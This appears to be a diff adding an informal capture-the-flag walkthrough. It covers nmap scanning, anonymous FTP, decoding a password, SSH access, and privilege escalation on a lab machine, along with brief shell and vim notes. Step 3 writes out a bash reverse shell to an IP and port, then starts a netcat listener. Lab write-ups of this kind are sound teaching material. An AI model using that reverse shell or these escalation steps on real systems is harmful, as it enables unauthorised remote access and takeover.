@@ -1,0 +1,57 @@
+-------------------------------------------------------------------------------------------------------------------------------------
+NOTE :-
+2>/dev/null is a shell redirection used in Linux/Unix to suppress error messages.
+🧠 What it means:
+
+    2> → redirect stderr (file descriptor 2).
+
+    /dev/null → a "black hole" file; anything sent here is discarded.
+
+VIM:-
+:wq!
+w for save data.
+q for exit.
+! for override.
+
+:%d 
+this for delete all data inside file.
+
+i for insert data.
+-------------------------------------------------------------------------------------------------------------------------------------
+
+STEP 1:-
+we find open ports using nmap here we show the scan tell us to ftp login by anonymous.
+cmd :-nmap -sV -sS -A -T4 -vv [ip]
+port :-21 ftp,
+       22 ssh,
+       80 http
+
+STEP 2:-
+goto the ftp server and download file than open file these will give us to encoded string.
+so we goto cypher identiphier web than analyze and than goto decoder website untill we many time doing these string is decoded
+than string is our weston user password.
+
+goto ssh server using these credential here we show the weston user are not have any flag so we go to the home dir. and show how many usr server have.
+
+cmd:-cd ../
+cage weston 
+
+here we not enter in cage folder this folder is restriction. so we thought we need to vertical privilages do.
+
+STEP 3:-
+we need to find all files that will open by cage usr.
+cmd :-find / -type f -user cage 2>/dev/null
+
+this will give some files we need to go there and show which we can read and write.
+here we show the one only one file we read and rite.
+using vim we open file and delete all unnecessary data and enter reverse shell bash script.
+
+; bash -c "bash -i >& /dev/tcp/10.17.7.140/4444 o>&1"
+
+than open nc 
+cmd :-nc -nvlp 4444
+we here successfully complete uor horizontal asceletion and become cage than we open some file that give one flag and one encoded string.
+so we just decode string like before that give us password of root user so we try 
+cmd :-su root 
+
+but these says this is only work on server terminal so we go there and try and we show the we successfully escalate vertical privileges and become root.
